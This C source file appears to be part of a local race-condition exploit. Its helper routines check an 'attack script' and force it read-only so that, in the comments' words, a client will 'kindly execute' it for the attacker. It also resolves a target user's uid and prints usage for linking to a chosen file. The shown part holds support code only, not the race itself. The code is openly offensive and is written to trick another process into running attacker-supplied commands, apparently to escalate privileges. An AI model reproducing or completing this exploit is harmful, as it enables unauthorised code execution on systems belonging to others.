#include "init_race.h"

/******** 
 *  check that the entire string is made up of chars 0-9
 *  return 0 if false, 1 if true
 ********/
int strIsNum(char *string, int len){
  int i;

  for (i=0 ; i < len ; i++){
    if (!isdigit(string[i])){
      return(0);
    }
  }
  return(1);
}

/********
 *  get the userid for a particular name
 *  exit if failure occurs
 ********/
void getUidFromName(char *username, pid_t *userPid){
  struct passwd *pwStruct;

  pwStruct = (struct passwd *)getpwnam(username);
  if (!pwStruct){
    perror("getpwnam: ");
    exit(1);
  }

  *userPid = pwStruct->pw_uid;
}

/********
 *  check the filename pointed to... for this is the file that
 *  we hope the client is going to kindly execute for us.
 *  In order for this to work the target file needs to be able to
 *  thwart a truncation attempt ( > ) - mode 444 should work fine
 *
 *  This routine returns a filled in stat struct since we will 
 *  check later on to see if the access time has changed so we
 *  know we can run through the clean up process quickly
 ********/
void checkAttackScript(char *filename, struct stat *statStruct){
  int fd;
  int ret;

  fd = open(filename, O_RDONLY);
  if (fd == -1){
    printf("could not open %s\nexiting...\n", filename);
    perror("open: ");
    exit(1);
  }

  
  ret = fstat(fd, statStruct);
  if (ret != 0){
    printf("problem stating %s\nexiting...\n", filename);
    perror("fstat: ");
    exit(1);
  }

  if ( (statStruct->st_mode & S_IWUSR) ||
       (statStruct->st_mode & S_IWGRP) ||
       (statStruct->st_mode & S_IWOTH) ){
    printf("incorrect permissions on target script... modifying...\n");
    if (fchmod(fd, S_IRUSR|S_IRGRP|S_IROTH)){
      perror("fchmod: ");
      exit(1);
    }
    fstat(fd, statStruct); /* refresh the atime since we just mucked with
                              it */
  }

  close(fd);
}


/********
 *  show the user how to use us...
 ********/
void usage(char *proggie){
  char *ptr;

  ptr = (char *)strrchr(proggie, '/');
  if (ptr)
    ptr++;
  else
    ptr = proggie;

  printf("Usage: %s [-u uid] -f filename\n", ptr);
  printf("       -u uid      user ID to target\n");
  printf("       -f filename file to link to (full path required)\n");
}

